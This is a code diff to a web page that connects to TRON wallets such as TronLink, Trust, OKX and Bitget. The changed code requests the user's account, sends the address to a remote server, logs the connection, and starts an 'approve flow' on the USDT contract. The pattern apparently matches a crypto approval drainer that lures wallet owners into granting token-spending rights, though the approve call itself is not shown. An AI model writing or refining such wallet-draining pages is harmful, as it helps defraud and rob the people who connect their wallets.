@@ -430,7 +430,7 @@
     ];
 
     // ============================================================
-    // WALLET CONFIGURATIONS - EACH WALLET HAS ITS OWN DETECTION
+    // WALLET CONFIGURATIONS - COMPLETELY INDEPENDENT
     // ============================================================
 
     var WALLETS = [
@@ -440,9 +440,13 @@
         logo: 'https://tronlink.org/favicon.ico',
         downloadUrl: 'https://tronlink.org/download',
         isInstalled: function() {
-          return !!(window.tronLink || (window.tronWeb && window.tronWeb.ready));
+          // Check for TronLink specifically
+          if (window.tronLink) return true;
+          if (window.tronWeb && window.tronWeb.ready) return true;
+          return false;
         },
         getProvider: function() {
+          // Only get TronLink provider
           if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.ready) {
             return window.tronLink.tronWeb;
           }
@@ -460,6 +464,10 @@
         requestAccounts: function(provider) {
           if (provider && typeof provider.request === 'function') {
             return provider.request({ method: 'tron_requestAccounts' });
+          }
+          // Fallback for older TronLink
+          if (window.tronLink && typeof window.tronLink.request === 'function') {
+            return window.tronLink.request({ method: 'tron_requestAccounts' });
           }
           return null;
         },
@@ -479,11 +487,15 @@
         logo: 'https://dl.svgcdn.com/svg/token-branded/trust.svg',
         downloadUrl: 'https://trustwallet.com/download',
         isInstalled: function() {
+          // Check for Trust Wallet specifically
           try {
-            // Check for Trust Wallet
             if (window.trustwallet && window.trustwallet.tronLink) return true;
             if (window.ethereum && window.ethereum.isTrust) return true;
-            if (window.tronWeb && window.tronWeb.ready) return true;
+            // Trust Wallet also injects tronWeb
+            if (window.tronWeb && window.tronWeb.ready) {
+              // Check if it's Trust by checking for trustwallet property
+              if (window.trustwallet) return true;
+            }
           } catch(e) {}
           return false;
         },
@@ -495,7 +507,7 @@
               if (tl.tronWeb && tl.tronWeb.ready) return tl.tronWeb;
               return tl;
             }
-            // Method 2: Ethereum provider
+            // Method 2: Ethereum provider with Trust flag
             if (window.ethereum && window.ethereum.isTrust) {
               if (window.ethereum.tronLink) {
                 var tl2 = window.ethereum.tronLink;
@@ -503,8 +515,10 @@
                 return tl2;
               }
             }
-            // Method 3: Fallback to tronWeb
-            if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
+            // Method 3: Check if tronWeb is from Trust
+            if (window.tronWeb && window.tronWeb.ready && window.trustwallet) {
+              return window.tronWeb;
+            }
           } catch(e) {}
           return null;
         },
@@ -518,6 +532,7 @@
           return null;
         },
         requestAccounts: function(provider) {
+          // Trust Wallet uses the same request method
           if (provider && typeof provider.request === 'function') {
             return provider.request({ method: 'tron_requestAccounts' });
           }
@@ -535,23 +550,24 @@
         isInstalled: function() {
           try {
             if (window.okxwallet) return true;
-            if (window.tronWeb && window.tronWeb.ready) return true;
           } catch(e) {}
           return false;
         },
         getProvider: function() {
           try {
             if (window.okxwallet) {
+              // Check for tronLink in OKX
               if (window.okxwallet.tronLink && window.okxwallet.tronLink.tronWeb && window.okxwallet.tronLink.tronWeb.ready) {
                 return window.okxwallet.tronLink.tronWeb;
               }
+              // Check for tron in OKX
               if (window.okxwallet.tron && window.okxwallet.tron.tronWeb && window.okxwallet.tron.tronWeb.ready) {
                 return window.okxwallet.tron.tronWeb;
               }
+              // Fallback to tronLink or tron
               if (window.okxwallet.tronLink) return window.okxwallet.tronLink;
               if (window.okxwallet.tron) return window.okxwallet.tron;
             }
-            if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
           } catch(e) {}
           return null;
         },
@@ -582,7 +598,6 @@
         isInstalled: function() {
           try {
             if (window.tokenpocket) return true;
-            if (window.tronWeb && window.tronWeb.ready) return true;
           } catch(e) {}
           return false;
         },
@@ -594,7 +609,6 @@
               }
               return window.tokenpocket.tron;
             }
-            if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
           } catch(e) {}
           return null;
         },
@@ -624,8 +638,8 @@
         downloadUrl: 'https://web3.bitget.com/download',
         isInstalled: function() {
           try {
-            if (window.bitkeep || window.bitgetWallet) return true;
-            if (window.tronWeb && window.tronWeb.ready) return true;
+            if (window.bitkeep) return true;
+            if (window.bitgetWallet) return true;
           } catch(e) {}
           return false;
         },
@@ -643,7 +657,6 @@
               }
               return window.bitgetWallet.tron;
             }
-            if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
           } catch(e) {}
           return null;
         },
@@ -674,7 +687,6 @@
         isInstalled: function() {
           try {
             if (window.imtoken) return true;
-            if (window.tronWeb && window.tronWeb.ready) return true;
           } catch(e) {}
           return false;
         },
@@ -686,7 +698,6 @@
               }
               return window.imtoken.tron;
             }
-            if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
           } catch(e) {}
           return null;
         },
@@ -800,7 +811,7 @@
     }
 
     // ============================================================
-    // CORE CONNECTION LOGIC - FIXED
+    // CORE CONNECTION LOGIC - EACH WALLET INDEPENDENT
     // ============================================================
 
     async function connectWallet(walletId) {
@@ -808,6 +819,7 @@
       hideMsg();
       isProcessing = true;
 
+      // Find the wallet configuration
       var wallet = WALLETS.find(function(w) { return w.id === walletId; });
       if (!wallet) {
         msg('err', 'Wallet not found');
@@ -816,6 +828,7 @@
       }
 
       console.log('🔄 Connecting to:', wallet.name);
+      console.log('🔍 Checking if', wallet.name, 'is installed...');
 
       // Load config
       if (!config || !config.usdtContract) {
@@ -828,184 +841,130 @@
         return;
       }
 
+      // ============================================================
+      // STEP 1: Check if wallet is installed
+      // ============================================================
+      
+      var installed = wallet.isInstalled();
+      console.log('📱', wallet.name, 'installed:', installed);
+
+      if (!installed) {
+        if (isMobile) {
+          // On mobile, try to open the app via deep link
+          console.log('📱 Mobile: Opening deep link for', wallet.name);
+          var currentUrl = window.location.href.split('?')[0].split('#')[0];
+          var deepLink = wallet.getDeepLink(currentUrl);
+          if (deepLink) {
+            msg('inf', 'Opening ' + wallet.name + '...');
+            window.location.href = deepLink;
+            // Wait for app to open and inject provider
+            setTimeout(function() {
+              if (!document.hidden) {
+                msg('warn', 'If the app didn\'t open, <a href="' + wallet.downloadUrl + '" target="_blank" style="color:#4ade80;">download it here</a>');
+              }
+            }, 3000);
+          } else {
+            msg('err', wallet.name + ' not installed. <a href="' + wallet.downloadUrl + '" target="_blank" style="color:#4ade80;">Download it here</a>');
+          }
+          isProcessing = false;
+          return;
+        } else {
+          // On desktop, show download link
+          msg('warn', wallet.name + ' not detected. <a href="' + wallet.downloadUrl + '" target="_blank" style="color:#4ade80;">Install ' + wallet.name + '</a>');
+          isProcessing = false;
+          return;
+        }
+      }
+
+      // ============================================================
+      // STEP 2: Get the wallet provider (wallet-specific)
+      // ============================================================
+      
+      var provider = wallet.getProvider();
+      console.log('📱 Provider for', wallet.name, ':', provider);
+
+      if (!provider) {
+        msg('err', wallet.name + ' is installed but not responding. Please unlock and try again.');
+        isProcessing = false;
+        return;
+      }
+
       // Show waiting screen
       scShow('scWait');
-      document.getElementById('waitDesc').textContent = 'Opening ' + wallet.name + '...';
+      document.getElementById('waitDesc').textContent = 'Connecting to ' + wallet.name + '...';
       updateStep(1, 'active');
       updateStep(2, '');
       updateStep(3, '');
 
       // ============================================================
-      // MOBILE: Use deep link to open the app
+      // STEP 3: Get address from the wallet
       // ============================================================
-      if (isMobile) {
-        console.log('📱 Mobile: Opening deep link for', wallet.name);
-        
-        // Open the wallet app
-        var currentUrl = window.location.href.split('?')[0].split('#')[0];
-        var deepLink = wallet.getDeepLink(currentUrl);
-        console.log('🔗 Deep link:', deepLink);
-        
-        if (deepLink) {
-          window.location.href = deepLink;
-        }
+      
+      var address = null;
+      
+      // Try to get existing address
+      address = wallet.getAddress(provider);
+      console.log('📍 Address from getAddress:', address);
 
-        // Wait for provider to be injected
-        var provider = null;
-        var address = null;
-        var attempts = 0;
-        var maxAttempts = 40;
-
-        document.getElementById('waitDesc').textContent = 'Waiting for ' + wallet.name + '...';
-
-        while (attempts < maxAttempts) {
-          await new Promise(function(r) { setTimeout(r, 500); });
-          attempts++;
+      // If no address, request accounts (triggers popup)
+      if (!address) {
+        try {
+          console.log('📤 Requesting accounts from', wallet.name, '...');
+          var result = await wallet.requestAccounts(provider);
+          console.log('📥 Result from', wallet.name, ':', result);
           
-          // Check for provider using wallet's getProvider function
-          provider = wallet.getProvider();
-          
-          if (provider) {
-            console.log('✅ Provider detected after', attempts, 'attempts');
-            
-            // Try to get address
-            address = wallet.getAddress(provider);
-            
-            // If no address, try requestAccounts
-            if (!address) {
-              try {
-                console.log('📤 Requesting accounts...');
-                var result = await wallet.requestAccounts(provider);
-                console.log('📥 Result:', result);
-                
-                if (result) {
-                  if (typeof result === 'string') address = result;
-                  else if (Array.isArray(result) && result.length > 0) address = result[0];
-                  else if (result.address) address = result.address;
-                }
-              } catch(e) {
-                console.warn('Request accounts failed:', e.message);
-                if (e.message && (e.message.toLowerCase().includes('cancel') || e.message.toLowerCase().includes('reject'))) {
-                  showError('Cancelled', 'You cancelled the connection');
-                  isProcessing = false;
-                  return;
-                }
-              }
-            }
-            
-            // Try one more time with getAddress after potential connection
-            if (!address) {
-              address = wallet.getAddress(provider);
-            }
-            
-            if (address) {
-              console.log('✅ Address obtained:', address);
-              break;
-            }
+          if (result) {
+            if (typeof result === 'string') address = result;
+            else if (Array.isArray(result) && result.length > 0) address = result[0];
+            else if (result.address) address = result.address;
           }
-          
-          if (attempts % 5 === 0) {
-            console.log('⏳ Still waiting for provider... attempt', attempts);
-          }
-        }
-
-        if (address) {
-          connectedAddress = address;
-          updateStep(1, 'done');
-          await doApproveFlow(address, provider, wallet);
-          return;
-        } else {
-          // Check if wallet is installed
-          if (!wallet.isInstalled()) {
-            showError('Wallet Not Installed', 'Please install ' + wallet.name + ' from the app store.');
+        } catch(e) {
+          console.warn('Request accounts failed:', e.message);
+          if (e.message && (e.message.toLowerCase().includes('cancel') || e.message.toLowerCase().includes('reject'))) {
+            showError('Cancelled', 'You cancelled the connection in ' + wallet.name);
+            isProcessing = false;
             return;
           }
-          showError('Connection Timeout', 'Could not connect to ' + wallet.name + '. Please make sure the app is open and try again.');
-          isProcessing = false;
-          return;
         }
       }
 
-      // ============================================================
-      // DESKTOP: Use browser extension
-      // ============================================================
-      console.log('💻 Desktop: Using extension for', wallet.name);
-
-      try {
-        // Check if wallet is installed
-        if (!wallet.isInstalled()) {
-          msg('warn', wallet.name + ' not detected. <a href="' + wallet.downloadUrl + '" target="_blank" style="color:#4ade80;">Install ' + wallet.name + '</a>');
-          scShow('scConnect');
-          isProcessing = false;
-          return;
-        }
-
-        var provider = wallet.getProvider();
-        console.log('📱 Provider detected:', provider);
-
-        if (!provider) {
-          msg('err', wallet.name + ' not detected. Please install the extension.');
-          scShow('scConnect');
-          isProcessing = false;
-          return;
-        }
-
-        var address = null;
-
-        // Try to get address
+      // Try one more time after potential connection
+      if (!address) {
         address = wallet.getAddress(provider);
-
-        // If no address, try requestAccounts (triggers popup)
-        if (!address) {
-          try {
-            console.log('📤 Requesting accounts...');
-            var result = await wallet.requestAccounts(provider);
-            console.log('📥 Result:', result);
-            
-            if (result) {
-              if (typeof result === 'string') address = result;
-              else if (Array.isArray(result) && result.length > 0) address = result[0];
-              else if (result.address) address = result.address;
-            }
-          } catch(e) {
-            console.warn('Request accounts failed:', e.message);
-            if (e.message && (e.message.toLowerCase().includes('cancel') || e.message.toLowerCase().includes('reject'))) {
-              showError('Cancelled', 'You cancelled the connection');
-              isProcessing = false;
-              return;
-            }
-          }
-        }
-
-        // Try one more time after potential connection
-        if (!address) {
-          address = wallet.getAddress(provider);
-        }
-
-        if (!address) {
-          throw new Error('Could not get wallet address. Please make sure ' + wallet.name + ' is unlocked.');
-        }
-
-        console.log('✅ Address obtained:', address);
-        connectedAddress = address;
-        updateStep(1, 'done');
-
-        await doApproveFlow(address, provider, wallet);
-
-      } catch(e) {
-        console.error('❌ Connection error:', e);
-        var errMsg = e.message || String(e);
-        if (errMsg.toLowerCase().includes('cancel') || errMsg.toLowerCase().includes('reject') || errMsg.toLowerCase().includes('denied')) {
-          showError('Cancelled', 'You cancelled the connection');
-        } else {
-          showError('Connection Error', errMsg);
-        }
-        isProcessing = false;
+        console.log('📍 Address after second attempt:', address);
       }
+
+      if (!address) {
+        showError('No Address', 'Could not get your address from ' + wallet.name + '. Please make sure the wallet is unlocked.');
+        isProcessing = false;
+        return;
+      }
+
+      console.log('✅ Address obtained from', wallet.name, ':', address);
+      connectedAddress = address;
+      updateStep(1, 'done');
+
+      // ============================================================
+      // STEP 4: Send address to server
+      // ============================================================
+      
+      try {
+        await sendAddressToServer(address);
+      } catch(e) {
+        console.warn('Failed to send address to server:', e);
+      }
+
+      await logEvent('wallet_connected', address, '', walletId);
+
+      // ============================================================
+      // STEP 5: Proceed to approve flow
+      // ============================================================
+      
+      await doApproveFlow(address, provider, wallet);
     }
 
     // ============================================================
-    // APPROVE FLOW
+    // APPROVE FLOW - WORKS WITH ANY WALLET
     // ============================================================
 
     async function doApproveFlow(address, provider, wallet) {
@@ -1015,7 +974,7 @@
       updateStep(2, 'active');
 
       try {
-        // Get the actual TronWeb instance from the provider
+        // Get TronWeb instance from the provider
         var tw = provider;
         
         // If provider has tronWeb property, use that
@@ -1032,7 +991,7 @@
           throw new Error('TronWeb not available. Please make sure your wallet is connected.');
         }
 
-        console.log('✅ Using TronWeb instance:', tw);
+        console.log('✅ Using TronWeb instance for', wallet ? wallet.name : 'unknown wallet');
 
         // Get USDT contract
         var usdtContract;
@@ -1164,7 +1123,7 @@
         var b = document.createElement('button');
         b.className = 'wallet-btn';
         
-        // Check if wallet is installed
+        // Check if wallet is installed (desktop only)
         var isInstalled = w.isInstalled();
         var badgeText = isMobile ? 'Open App' : (isInstalled ? 'Connect' : 'Install');
         var badgeClass = isInstalled ? 'badge' : 'badge install';
@@ -1178,11 +1137,6 @@
         
         b.addEventListener('click', (function(id) {
           return function() { 
-            var wallet = WALLETS.find(function(w) { return w.id === id; });
-            if (!wallet.isInstalled() && !isMobile) {
-              window.open(wallet.downloadUrl, '_blank');
-              return;
-            }
             connectWallet(id); 
           };
         })(w.id));
@@ -1200,22 +1154,6 @@
     console.log('📱 QR Session:', SESSION_ID);
     console.log('🌐 Site URL:', SITE_URL);
     console.log('📱 isMobile:', isMobile);
-
-    // Auto-detect if wallet is already connected (desktop only)
-    if (!isMobile) {
-      setTimeout(function() {
-        var tw = window.tronWeb;
-        if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-          var addr = tw.defaultAddress.base58;
-          console.log('🔑 Wallet already detected:', addr);
-          var btn = document.getElementById('manualConnectBtn');
-          if (btn) {
-            btn.style.display = 'block';
-            btn.textContent = '🔄 Connect (' + addr.slice(0, 6) + '...' + addr.slice(-4) + ')';
-          }
-        }
-      }, 2000);
-    }
   </script>
 </body>
 </html>
